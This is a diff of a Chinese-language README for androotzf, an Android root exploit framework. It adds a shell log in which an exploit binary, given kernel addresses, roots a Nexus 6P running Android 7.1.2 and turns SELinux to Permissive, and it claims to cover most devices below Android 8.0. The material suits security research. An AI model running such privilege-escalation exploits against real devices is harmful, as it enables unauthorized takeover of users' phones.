@@ -2,15 +2,11 @@
 #+OPTIONS: toc:nil
 #+AUTHOR: idhyt
 
-[[https://github.com/idhyt/androotzf][androotzf]] 最近整理电脑时看到的吃灰代码, 早期研究 Android Root 时做的提权方案.
+[[https://github.com/idhyt/androotzf][androotzf]] 早期研究 Android Root 时做的提权方案.
 
-感激曾经一起学习和共事的伙伴们, 开源大部分功能为后来者提供一套学习素材.
+开源部分基本能应对市面上 *<8.0* 以下的所有机型，部分适配的参数可参考 [[./root_info.sql#L27][root_parameters]]
 
-** Warning
-
-*请遵守GPL开源协议, 请遵守法律法规, 本项目仅供学习和交流, 请勿用于非法用途!*
-
-*道路千万条, 安全第一条, 行车不规范, 亲人两行泪.*
+*请遵守法律法规, 本项目仅供学习和交流, 请勿用于非法用途!*
 
 ** Android Root Zap Framework [100%]
 
@@ -40,9 +36,51 @@
 
 *1051*: CVE-2016-5195 dirtycow漏洞, android 5.0以下机型
 
+将已编译好的二进制push到设备快速验证
+
+#+begin_src shell
+angler:/ $ getprop | grep fingerprint
+[init.svc.fingerprintd]:[running]
+[ro.bootimage.build.fingerprint]:[google/angler/angler:7.1.2/N2G48C/4104010:user/release-keys]
+[ro.build.fingerprint]:[google/angler/angler:7.1.2/N2G48C/4104010:user/release-keys]
+[ro.vendor.build.fingerprint]:[google/angler/angler:7.1.2/N2G48C/4104010:user/release-keys]
+angler:/ $ cat/proc/version
+Linux version 3.10.73-g5b0be8f02fe (android-build@wphs1.hot.corp.google.com) (gcc version 4.9.x-google 20140827 (prerelease) (GCC) ) #1 SMP PREEMPT Thu Jun 8 18:03:16 UTC 2017
+angler:/ $ getenforce
+Enforcing
+angler:/ $ ./data/local/tmp/rootz/1001 "n=1001&k=[101=0xffffffc001a044a0;102=0x48;104=0xffffffc001779fe0;105=0x70..."
+[*] start,pid:9361, tid: 9361,uid:2000, gid: 2000
+    [1] padding data to fake obj.
+    [2]prepare heap spray data.
+[?] fix mmap bugs
+    [3] trigger exploit.
+    [4]test for r/wkernel capacity
+[!] jop to patch thread_info.addr_limit
+[-] FAILED READ @Oxffffffc001a044e8:-1,errno=14,msg=Bad address
+[!] jop to patch thread_info.addr_limit
+[+] cat arbitraryread/write succeededOxffffffc001a044e8=0xffffffc00024c2c4
+    [5] get root, patch cred & sid
+[*] get current thread_info cred offset
+[+] thread_info tasks address=Oxffffffc01c7c1830
+[*] get current thread_info cred offset
+[+] init thread_info tasks address-Oxffffffc00e9a02b0
+[+] init task sid=38
+    patch security.sid
+    osid=0x26,sid=0x26,exec_sid=0x0,create_sid=0x0,keycreate_sid=0x0,sockcreate_sid=0x0
+[+] patch security success.
+[*] end,pid:9361,tid:9361,uid:0,gid:0
+angler:/ #
+angler:/ # id
+uid=0(root)gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc) context=u:r:init:s0
+angler:/ #
+angler:/ # getenforce
+Permissive
+angler:/ #
+#+end_src
+
 ** Build
 
-需要保证主机上存在 make 和 ndk-build (版本过高可能存在兼容性问题, 建议小于25以下版本)
+编译需要保证主机上存在 make 和 ndk-build (版本过高可能存在兼容性问题, 建议小于25以下版本)
 
 #+begin_src shell
 
